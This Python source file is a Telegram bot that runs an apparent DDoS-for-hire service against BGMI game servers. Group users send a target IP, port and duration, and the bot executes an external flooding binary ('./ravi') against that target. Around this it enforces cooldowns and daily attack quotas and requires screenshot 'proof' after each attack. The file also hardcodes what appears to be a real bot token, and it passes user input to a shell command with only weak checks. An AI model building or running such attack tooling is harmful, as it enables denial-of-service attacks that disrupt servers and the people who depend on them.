import sys
import subprocess
import logging
import asyncio
import io
import os
from datetime import datetime, timedelta, timezone

# ================== AUTO DEPENDENCY INSTALL ==================
required_packages = {
    'python-telegram-bot': 'telegram',
    'Pillow': 'PIL',
    'imagehash': 'imagehash'
}

def install_packages():
    missing = []
    for pkg, imp in required_packages.items():
        try:
            __import__(imp)
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print("Installing missing dependencies...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
        print("Dependencies installed. Please restart the script.")
        sys.exit(0)

install_packages()

# ================== ORIGINAL CODE (NO CHANGES) ==================
from PIL import Image
import imagehash
from telegram import ChatPermissions, Update
from telegram.ext import (
    Application, MessageHandler, filters, CallbackContext, CommandHandler
)

# Logging setup
logging.basicConfig(level=logging.INFO)

# Bot Token & Group ID
TOKEN = "8150782146:AAEsZZMby1BTKRetwD2sxyo3Z-UkPq525qM"  # Replace with actual token
CHANNEL_ID = -1002497884624  # Replace with your group ID

# Attack & Cooldown Config
COOLDOWN_DURATION = 10  # 10 sec cooldown
DAILY_ATTACK_LIMIT = 100  # Max daily attacks
EXEMPTED_USERS = [6957116305]  # Users with no cooldown
SCREENSHOT_TIMEOUT = 120  # 2 minutes to send screenshot

user_attacks = {}  # Tracks number of attacks per user
user_cooldowns = {}  # Tracks cooldown time per user
user_photos = {}  # Tracks feedback status per user
image_hashes = {}  # Tracks duplicate images
pending_screenshots = {}  # Tracks users who need to send screenshots
active_attacks = {}  # Track ongoing attacks: {user_id: attack_task}

async def get_image_hash(bot, file_id):
    new_file = await bot.get_file(file_id)
    image_bytes = await new_file.download_as_bytearray()
    image = Image.open(io.BytesIO(image_bytes))
    return str(imagehash.average_hash(image))

async def handle_images(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    if update.message.photo:
        file_id = update.message.photo[-1].file_id
        img_hash = await get_image_hash(context.bot, file_id)

        if img_hash in image_hashes:
            mute_duration = 15  # Mute for 15 minutes
            unmute_time = datetime.now(timezone.utc) + timedelta(minutes=mute_duration)

            await context.bot.restrict_chat_member(
                chat_id, user_id, ChatPermissions(can_send_messages=False), until_date=unmute_time
            )

            await update.message.reply_text(
                f"⚠️ @{update.message.from_user.username} duplicate photo bheji!\n"
                f"⏳ Duplicate feedback hai real feedback do islie apko {mute_duration} min ke liye mute kiya jata hai."
            )

            context.job_queue.run_once(unmute_user, mute_duration * 60, data={"chat_id": chat_id, "user_id": user_id})

        else:
            image_hashes[img_hash] = user_id
            user_photos[user_id] = True
            
            if user_id in pending_screenshots:
                del pending_screenshots[user_id]
                await update.message.reply_text("✅ Screenshot verified! Ab aap next attack kar sakte ho.")
            else:
                await update.message.reply_text("✅ Feedback received! Ab aap next attack kar sakte ho.")

async def unmute_user(context: CallbackContext):
    job_data = context.job.data
    chat_id, user_id = job_data["chat_id"], job_data["user_id"]

    await context.bot.restrict_chat_member(chat_id, user_id, ChatPermissions(can_send_messages=True))
    await context.bot.send_message(chat_id, f"✅ @{user_id} ka mute hat gaya!")

async def bgmi_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    if chat_id != CHANNEL_ID:
        await update.message.reply_text("⚠️ Bot sirf authorized channels me kaam karega!")
        return

    if user_id in active_attacks and not active_attacks[user_id].done():
        await update.message.reply_text("⚠️ Ek attack pehle se chalu hai! Pehle usko khatam hone do.")
        return

    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining_time = (user_cooldowns[user_id] - datetime.now()).seconds
        await update.message.reply_text(f"⚠️ Cooldown active! {remaining_time // 60} min {remaining_time % 60} sec rukho.")
        return

    if user_id not in user_attacks:
        user_attacks[user_id] = 0
    if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
        await update.message.reply_text("🚀 Tumhara daily attack limit khatam ho gaya, kal try karo!")
        return

    if user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
        await update.message.reply_text("⚠️ Feedback nahi diya, pehle feedback photo bhejo!")
        return

    try:
        args = context.args
        if len(args) != 3:
            raise ValueError("⚙ Format: /bgmi <IP> <Port> <Duration>")

        target_ip, target_port, user_duration = args
        if not target_ip.replace('.', '').isdigit() or not target_port.isdigit() or not user_duration.isdigit():
            raise ValueError("⚠️ Invalid Input! Sahi format me likho.")

        user_attacks[user_id] += 1
        user_photos[user_id] = False
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        await update.message.reply_text(
            f"🚀 Attack started on {target_ip}:{target_port} for 180 seconds! \n❗ Feedback photo bhejna mat bhoolna."
        )

        attack_task = asyncio.create_task(
            run_attack_command_async(target_ip, int(target_port), chat_id, context.bot, user_id)
        )
        active_attacks[user_id] = attack_task

    except Exception as e:
        await update.message.reply_text(str(e))

async def run_attack_command_async(target_ip, target_port, chat_id, bot, user_id):
    try:
        command = f"./ravi {target_ip} {target_port} 180 500"  # <-- ATTACK COMMAND (NO CHANGES)
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()

        await bot.send_message(chat_id, f"✅ Attack finished on {target_ip}:{target_port}")
        logging.info(f"✅ Attack finished on {target_ip}:{target_port}")
        
        pending_screenshots[user_id] = datetime.now() + timedelta(seconds=SCREENSHOT_TIMEOUT)
        remaining = SCREENSHOT_TIMEOUT
        
        await bot.send_message(
            chat_id,
            f"╔════════════════════════════════╗\n"
            f"║ 📸 PENDING SCREENSHOT 📸 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 You have a completed attack\n"
            f"🔸 Please send screenshot proof\n\n"
            f"⏳ <b>Time remaining:</b> <code>{int(remaining)} seconds</code>\n"
            f"⚠️ After timeout: 30 minute attack block",
            parse_mode="HTML"
        )
        
        asyncio.create_task(check_screenshot_timeout(user_id, chat_id, bot))
        
    except Exception as e:
        logging.error(f"Error: {e}")
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

async def check_screenshot_timeout(user_id, chat_id, bot):
    await asyncio.sleep(SCREENSHOT_TIMEOUT)
    
    if user_id in pending_screenshots:
        block_until = datetime.now() + timedelta(minutes=30)
        user_cooldowns[user_id] = block_until
        del pending_screenshots[user_id]
        
        await bot.send_message(
            chat_id,
            f"⚠️ @{user_id} ne screenshot nahi bheja!\n"
            f"⏳ Ab aapko 30 minute tak attack karne ki permission nahi hogi."
        )

def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("bgmi", bgmi_command))
    application.add_handler(MessageHandler(filters.PHOTO, handle_images))
    logging.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
